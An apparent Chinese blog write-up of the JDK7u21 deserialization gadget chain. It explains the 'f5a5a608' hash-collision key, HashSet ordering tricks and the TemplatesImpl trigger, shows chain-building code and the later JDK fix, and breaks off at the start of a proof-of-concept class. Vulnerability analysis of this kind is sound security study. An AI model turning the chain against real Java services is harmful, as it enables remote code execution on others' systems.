+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">调用&#123;@code java.lang.Object&#125;中声明的&#123;@code hashCode&#125;、&#123;@code equals&#125;或&#123;@code toString&#125;方法。将对代理实例上的Object&#125;进行编码并将其分派给调用处理程序的&#123;@code invoke&#125;方法，其方式与接口方法调用的编码和分派方式相同，如上所述。&#123;@code Method&#125;对象传递给&#123;@code invoke&#125;的声明类将是&#123;@code java.lang.Object&#125;。代理实例的其他公共方法继承自&#123;@code java.lang。Object&#125;不会被代理类覆盖，所以这些方法的调用行为就像&#123;@code java.lang.Object&#125;实例的行为一样。</span><br><span class="line">【题外话：注解@code的使用语法&#123;@code text&#125; 被解析成&lt;code&gt;text&lt;&#x2F;code&gt;，将文本标记为代码样式的文本，在code内部可以使用 &lt; 、&gt; 等不会被解释成html标签, code标签有自己的样式。</span><br><span class="line">一般在Javadoc中只要涉及到类名或者方法名，都需要使用@code进行标记。】</span><br></pre></td></tr></table></figure>
+
+<p>如果调用proxy的hashCode方法，当代理handler是AnnotationInvocationHandler对象时，proxy.hashCode会通过AnnotationInvocationHandler.invoke处理，实际上AnnotationInvocationHandler.invoke会通过AnnotationInvocationHandler.hashCodeImpl()来具体实现。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (var4.equals(<span class="string">"hashCode"</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.hashCodeImpl();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>AnnotationInvocationHandler.hashCodeImpl()：在P神的JDK7u21文章里，特别分析了该方法，我们来看下。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">hashCodeImpl</span><span class="params">()</span> </span>&#123; </span><br><span class="line">	<span class="keyword">int</span> result = <span class="number">0</span>; </span><br><span class="line">    <span class="comment">// 循环memberValues的所有键值对，将键值对通过计算获取的结果进行累加。memberValues指的是AnnotationInvocationHandler实例化时传入的Map实例，&lt;"f5a5a608",TemplateImpl实例&gt;</span></span><br><span class="line">	<span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; e : memberValues.entrySet()) &#123; </span><br><span class="line">		result += (<span class="number">127</span> * e.getKey().hashCode()) ^ memberValueHashCode(e.getValue()); </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>当 memberValues 中只有一个key和一个value时，该哈希简化成 (127 * key.hashCode()) ^ value.hashCode() 。如果key.hashCode() 等于0，任何数异或0的结果仍是他本身，那么该哈希可以简化成value.hashCode() 。 那么当value就是TemplateImpl对象时，返回的result是TemplateImpl对象的hash，那么这时候proxy.equals(TemplatesImpl实例)就是TemplateImpl对象的hash，这两个哈希就变成完全相等。</p>
+</blockquote>
+<p>所以key.hashCode=0，找到这个key，value是TemplateImpl实例。如何找到这个key，我们可以通过计算：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">long</span> i = <span class="number">0</span>; i &lt; <span class="number">9999999999L</span>; i++) &#123;</span><br><span class="line">	<span class="comment">// 当其hashCode是0就是我们想要的结果</span></span><br><span class="line">	<span class="keyword">if</span> (Long.toHexString(i).hashCode() == <span class="number">0</span>) &#123;</span><br><span class="line">		System.out.println(Long.toHexString(i)); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>hash碰撞后的结果会有多个，将其中一个作为key就可以，所以针对AnnotationInvocationHandler实例化的Map对象进行插入操作即Map.put(“f5a5a608”,TemplateImpl实例)。</p>
+<p>2.1和2.2小结：</p>
+<p>这时候为了触发命令执行，我们就找到一条链：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashMap.put(proxy,xx)---&gt;Proxy.hashCode()---&gt;AnnotationInvocationHandler.invoke()---&gt;AnnotationInvocationHandler.hashCodeImpl()---&gt;Map.put(&quot;f5a5a608&quot;,TemplateImpl实例)满足---&gt;proxy.equals(TemplatesImpl实例)---&gt;AnnotationInvocationHandler.equalsImpl()---&gt;TemplatesImpl.getOutputProperties</span><br></pre></td></tr></table></figure>
+
+<p>接下来的问题是如何能够在反序列化时调用HashMap.put(proxy,xx)？</p>
+<h5 id="2-3、如何能够调用HashMap-put？"><a href="#2-3、如何能够调用HashMap-put？" class="headerlink" title="2.3、如何能够调用HashMap.put？"></a>2.3、如何能够调用HashMap.put？</h5><p>调用HashMap.put我们考虑HashSet，因为<strong>HashSet内部使用HashMap来存储数据</strong>，并且HashSet重写了readObject方法，既然重写了readObject那么就有可能要调用HashMap.put方法来恢复数据结构。我们来看下HashSet.readObject()：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// 调用默认反序列化方法</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    <span class="comment">// 读取HashMap容量和负载因子,并创建备份HashMap</span></span><br><span class="line">    <span class="keyword">int</span> capacity = s.readInt();</span><br><span class="line">    <span class="keyword">float</span> loadFactor = s.readFloat();</span><br><span class="line">    <span class="comment">// 判断是否是LinkedHashSet实例，如果是就实例化一个LinkedHashMap对象，否则实例化一个HashMap对象</span></span><br><span class="line">    map = (((HashSet)<span class="keyword">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">           <span class="keyword">new</span> LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">           <span class="keyword">new</span> HashMap&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取map个数</span></span><br><span class="line">    <span class="keyword">int</span> size = s.readInt();</span><br><span class="line">    <span class="comment">// 循环反序列化所有元素</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        <span class="comment">// 按照e的原始类型反序列化，并put到hashmap</span></span><br><span class="line">        E e = (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT);<span class="comment">// 注意！！这里会调用HashMap.put</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在HashSet.readObject()中读取每个entry后会将其put到HashMap中，因此只要我们序列化一个HashSet，反序列化时就会调用HashMap.put()。</p>
+<p>另外需要注意一点，HashSet.add()在添加元素时，实际调用了HashMap的put方法，将传入的参数作为key，value是一个常量，所以我们在调用HashSet.add(e)，添加的元素e实际都是HashMap的key，这也跟前面的2.1的put的<strong>key</strong>对上了，add添加的就是TemplateImpl实例和Proxy实例。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// add的e就是HashMap键值对的key</span></span><br><span class="line">	<span class="keyword">return</span> map.put(e, PRESENT)==<span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么到这里，我们就可以构造完整的执行链：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashSet.readObject()---&gt;HashMap.put(proxy,xx)---&gt;Proxy.hashCode()---&gt;AnnotationInvocationHandler.invoke()---&gt;AnnotationInvocationHandler.hashCodeImpl()---&gt;Map.put(&quot;f5a5a608&quot;,TemplateImpl实例)满足---&gt;proxy.equals(TemplatesImpl实例)---&gt;AnnotationInvocationHandler.equalsImpl()---&gt;TemplatesImpl.getOutputProperties</span><br></pre></td></tr></table></figure>
+
+<h4 id="3、为什么有的POC入口是LinkedHashSet，有的是HashSet？"><a href="#3、为什么有的POC入口是LinkedHashSet，有的是HashSet？" class="headerlink" title="3、为什么有的POC入口是LinkedHashSet，有的是HashSet？"></a>3、为什么有的POC入口是LinkedHashSet，有的是HashSet？</h4><p>我看到有些分析文章提到了需要用LinkedHashSet而不是HashSet，因为LinkedHashSet是有序的HashSet是无序的。其实两个都可以作为入口点，不论LinkedHashSet还是HashSet，主要跟<strong>反序列化时在HashSet.readObject中调用map.put插入TemplatesImpl实例和Proxy实例前后顺序</strong>有关系，因为需要HashMap.put插入时的比较操作来触发命令执行，当插入Proxy实例需要TemplatesImpl实例已经存在才能调用proxy.equals(templatesimpl)，这里不懂可以回到2.1再理解下。</p>
+<p>LinkedHashSet可以保证我们的添加时候的顺序和反序列化时候的顺序一致，但是HashSet是无序的，不能保证这一点，那么我们如何让HashSet也满足反序列化时先读取TemplatesImpl实例再读取Proxy实例？</p>
+<p>答案如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">HashSet set = <span class="keyword">new</span> HashSet();</span><br><span class="line">map.put(<span class="string">"f5a5a608"</span>, <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;-<span class="number">16</span>&#125;);</span><br><span class="line">set.add(proxy);</span><br><span class="line">set.add(templates);</span><br><span class="line">map.put(<span class="string">"f5a5a608"</span>, templates);</span><br></pre></td></tr></table></figure>
+
+<p>我们知道HashMap的数据结构是数组+链表，虽然它的插入是无序的，但是它迭代读取所有元素时还是会按照数组下标顺序来，那么我们只要让Proxy实例所在的数组索引大于Template实例所在数组索引就可以满足条件。HashMap初始长度为16，当proxy在最大下标15时就可以满足这个条件。我们知道proxy.hash可以根据AnnotationInvocationHandler.hashCodeImpl进行计算，AnnotationInvocationHandler.hashCodeImpl时根据map来计算的，map我们可控。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1、计算数据索引index</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">indexFor</span><span class="params">(<span class="keyword">int</span> h, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> h &amp; (length-<span class="number">1</span>); <span class="comment">// h =15，15 &amp; 15 =15</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、计算hash</span></span><br><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (useAltHashing) &#123;</span><br><span class="line">        <span class="keyword">if</span> (k <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            <span class="keyword">return</span> sun.misc.Hashing.stringHash32((String) k);</span><br><span class="line">        &#125;</span><br><span class="line">        h = hashSeed;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// proxy.hashCode最终是AnnotationInvocationHandler.hashCodeImpl计算的结果</span></span><br><span class="line">    h ^= k.hashCode();</span><br><span class="line">    </span><br><span class="line">    h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>); <span class="comment">// 返回需要是15</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据上面代码我们来反推下map需要put的键值对。</p>
+<ol>
+<li>下标indexFor根据hash和容量计算，那么proxy.hash需要是15；</li>
+<li>如何让proxy.hash=15？我们让hash(proxy)的结果是15就可以让indexFor是15，那么最终hash里面<code>h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4)</code>的值需要等于15；</li>
+<li>那么proxy.hashCode值是多少能让其hash(proxy)是15？我们可以通过计算：</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">caculate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>;i++)&#123;</span><br><span class="line">        <span class="comment">// 将上面计算hash代码拿下来，单独计算下</span></span><br><span class="line">        <span class="keyword">int</span> h =<span class="number">0</span>;</span><br><span class="line">        h ^= i;</span><br><span class="line">        h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">        <span class="keyword">if</span> ( (h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>) )== <span class="number">15</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">"i:"</span> + i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>计算的结果是当i=15，能够让hash(proxy)=5，也就是proxy.hashCode需要是15。当proxy.hashCode=15，map怎么赋值？这就简单了，我们来看下AnnotationInvocationHandler.hashCodeImp，当e.getKey().hashCode()=0，hashCodeImpl返回的值是memberValueHashCode(e.getValue())的值，计算原生类型数组memberValueHashCode()是可控的，我们下面以int数组为例进行计算，当e.getValue() = a[]{-16}能够返回proxy.hashCode是15。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1、AnnotationInvocationHandler.hashCodeImpl关键代码</span></span><br><span class="line"><span class="comment">// 当e.getKey().hashCode()==0，当e.getKey()==f5a5a608</span></span><br><span class="line">result += (<span class="number">127</span> * e.getKey().hashCode()) ^ memberValueHashCode(e.getValue());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、 memberValueHashCode(e.getValue())：原生类型</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">memberValueHashCode</span><span class="params">(Object var0)</span> </span>&#123;</span><br><span class="line">    Class var1 = var0.getClass();</span><br><span class="line">    <span class="keyword">if</span> (!var1.isArray()) &#123;</span><br><span class="line">        <span class="comment">//非原生类型 </span></span><br><span class="line">        <span class="keyword">return</span> var0.hashCode();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="keyword">byte</span>[]<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Arrays.hashCode((<span class="keyword">byte</span>[])((<span class="keyword">byte</span>[])var0));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="keyword">char</span>[]<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Arrays.hashCode((<span class="keyword">char</span>[])((<span class="keyword">char</span>[])var0));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="keyword">double</span>[]<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Arrays.hashCode((<span class="keyword">double</span>[])((<span class="keyword">double</span>[])var0));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="keyword">float</span>[]<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Arrays.hashCode((<span class="keyword">float</span>[])((<span class="keyword">float</span>[])var0));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="keyword">int</span>[]<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Arrays.hashCode((<span class="keyword">int</span>[])((<span class="keyword">int</span>[])var0));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="keyword">long</span>[]<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Arrays.hashCode((<span class="keyword">long</span>[])((<span class="keyword">long</span>[])var0));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="keyword">short</span>[]<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Arrays.hashCode((<span class="keyword">short</span>[])((<span class="keyword">short</span>[])var0));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        return var1 == boolean[].class ? Arrays.hashCode((boolean[])((boolean[])var0)) : Arrays.hashCode((Object[])((Object[])var0));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3、 memberValueHashCode调用AnnotationInvocationHandler.hashCode(int a[])，当返回的result是15时，并且让a数组只有一个元素，element=-16</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> element : a)</span><br><span class="line">        result = <span class="number">31</span> * result + element;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>到这里有人可能会提出一点，当proxy和templates计算出的数组下标刚好一样都是15怎么办？我们可以通过先set.add(proxy)再set.add(templates)，因为JDK1.7 HashMap的插入采用的是<strong>头插法</strong>，这样能让链表中templates在前proxy在后，也能够再读取所有元素时先读templates再读proxy。</p>
+<h4 id="4、关于map-put-quot-f5a5a608-quot-templates-的位置问题"><a href="#4、关于map-put-quot-f5a5a608-quot-templates-的位置问题" class="headerlink" title="4、关于map.put(&quot;f5a5a608&quot;, templates);的位置问题"></a>4、关于<code>map.put(&quot;f5a5a608&quot;, templates);</code>的位置问题</h4><p>有一点是需要说明的就是<code>map.put(&quot;f5a5a608&quot;, templates);</code>的位置，它必须在<code>set.add(proxy);</code>后被执行。在HashSet反序列化时readObject会先执行<code>E e = (E) s.readObject();</code>，再调用HashMap.put，我们知道ObjectInputStream处理序列化时会把目标的属性值反序列化赋给对象的属性，所以s.readObject会先序列化map，然后将其赋值给tempHandler的属性，同理tempHandler赋值给proxy属性，这时候调用HashMap.put就可以触发命令执行。</p>
+<p><img src="/imgs/image-20210718094359578.png" alt="image-20210718094359578"></p>
+<p>那么放在<code>map.put(&quot;f5a5a608&quot;, templates);</code>在<code>set.add(proxy);</code>之前和之后的区别是什么？</p>
+<ol>
+<li>放在之前也是会执行命令的，但是它<strong>不是在反序列化操作时执行</strong>，并且反序列化时会报错找不到我们的恶意类Evil而终止程序。因为<code>map.put(&quot;f5a5a608&quot;, templates);</code>在<code>set.add(proxy);</code>前面，当我们add时会调用HashMap.put从而进行上述2.1的比较操作最终触发命令执行。为什么放在前面反序列化不会触发命令执行并且还报错终止？经过调试发现，templates._class属性原来应该是null，但是经过<code>map.put(&quot;f5a5a608&quot;, templates);set.add(proxy);</code>后，该_class变成了Evil，这时候序列化再反序列化，会读取属性Evil的Class对象来赋值给templates._class，但是由于Evil实际上只有字节码，没有本地的class文件，所以读取Evil.class会报错找不到类。</li>
+<li>放在后面，<code>set.add(proxy);</code>正常添加没有触发执行<code>proxy.equals(TemplatesImpl实例)</code>，并未触发<code>Templates.getOutputProperties()-&gt;_class[i]=loader.defineClass(_bytecodes[i])</code>，所以templates._class还是null，在反序列化时也是正常反序列化，只有在反序列化了proxy并将其put到hashmap时才触发了执行，这时候通过读取_bytecodes将类赋值给templates._class就不会报错。</li>
+<li>所以变化在于templates._class的值，放在前面templates._class不是null，放在后面templates._class是null，前面会在没有反序列化时触发命令执行，templates._class通过Templates.getOutputProperties()调用到了<code>defineClass(_bytecodes[i])</code>就会被赋值，<strong>这时候在反序列化 首先templates._class不是null了，不满足命令执行的条件了</strong>，这也同样能解释为什么在 AnnotationInvocationHandler.equalsImpl()循环调用了Templates的两个方法getOutputProperties()和newTransformer()，但是只执行了一次命令。</li>
+</ol>
+<h3 id="二、类似漏洞的挖掘思路"><a href="#二、类似漏洞的挖掘思路" class="headerlink" title="二、类似漏洞的挖掘思路"></a>二、类似漏洞的挖掘思路</h3><ol>
+<li>具备执行命令的条件：如本次漏洞的TemplatesImpl.getOutputProperties()，TemplatesImpl内部定义了类加载器并重载了defineClass，能够实例化后我们的恶意类从而执行命令。</li>
+<li>利用链的串联，可以通过反向寻找方法的调用，可以借鉴常用的一些反序列化载体如HashMap、HashSet、AnnotationInvocationHandler等。</li>
+<li>反序列化重写了readObject，通过readObject能够最终触发命令执行。中间触发命令执行方法一般用到Method.invoke()来反射调用。</li>
+</ol>
+<h3 id="三、漏洞修复"><a href="#三、漏洞修复" class="headerlink" title="三、漏洞修复"></a>三、漏洞修复</h3><p>在我本地有个JDK1.8.0_181的环境，在AnnotationInvocationHandler.readObject()里面添加了对AnnotationInvocationHandler.Annotation的类型进行了检查，针对不是AnnotationType做出了进行了异常抛出以中断执行。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    var5 = AnnotationType.getInstance(var3);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IllegalArgumentException var13) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="四、POC"><a href="#四、POC" class="headerlink" title="四、POC"></a>四、POC</h3><p>参考<a href="https://l3yx.github.io/2020/02/22/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/#AnnotationInvocationHandler" target="_blank" rel="noopener">l3yx的poc</a>进行修改并调试：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.*;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="comment">//序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteArrayOutputStream btout = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(btout);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反序列化</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ByteArrayInputStream btin = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line">        ObjectInputStream objIn = <span class="keyword">new</span> ObjectInputStream(btin);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过反射为obj的属性赋值</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span 